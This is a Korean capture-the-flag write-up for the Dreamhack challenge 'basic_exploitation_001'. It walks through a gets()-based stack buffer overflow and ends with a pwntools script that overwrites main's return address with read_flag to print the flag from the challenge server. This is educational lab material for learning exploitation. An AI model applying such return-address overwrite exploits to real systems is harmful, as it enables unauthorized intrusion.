# basic_exploitation_001 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: basic_exploitation_001.c, basic_exploitation_001(ELF)
- tools:
## Brief Description
이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.  
프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.  
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.  
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec basic_exploitation_001
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
void read_flag() {
    system("cat flag");
}
```
`system("cat flag");`을 실행하여 FLAG를 출력한다.  
``` c
int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}

```
`gets()`함수를 통해 사용자로부터 입력을 받는다. `main()` 함수에 `read_flag()` 함수를 호출하는 로직이 존재하지 않는다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
gets(buf); // buf size: 0x80
```
`buf`의 크기는 0x80인 반면, 안전하지 않은 `gets()` 함수를 사용하여 BOF 취약점이 발생한다.
## Exploit
### Strategy
canary가 비활성화 되어있어 canary 우회 없이 BOF 취약점을 이용하여 `main()`의 리턴 주소를 덮어쓸 수 있으며, PIE 또한 비활성화 되어 있으므로  `read_flag()` 함수의 주소가 고정된다.  
따라서 `main()`의 리턴 주소를 `read_flag()`로 덮어써 FLAG를 출력시킬 수 있다.  
### Exploitation Steps
``` sh
pwndbg> info functions read_flag
All functions matching regular expression "read_flag":

Non-debugging symbols:
0x080485b9  read_flag
```
`pwndbg`를 통해 read_flag()`의 주소가 `0x080485b9`인 것을 확인할 수 있다.  
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x4 |
| ebp |  |
| buf | -0x80 |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 18457) 

read_flag_addr = 0x080485b9

# payload
payload = b''
payload += b'A' * 0x80 + b'B' * 0x4
payload += p32(read_flag_addr)
p.sendline(payload)

p.interactive()
```
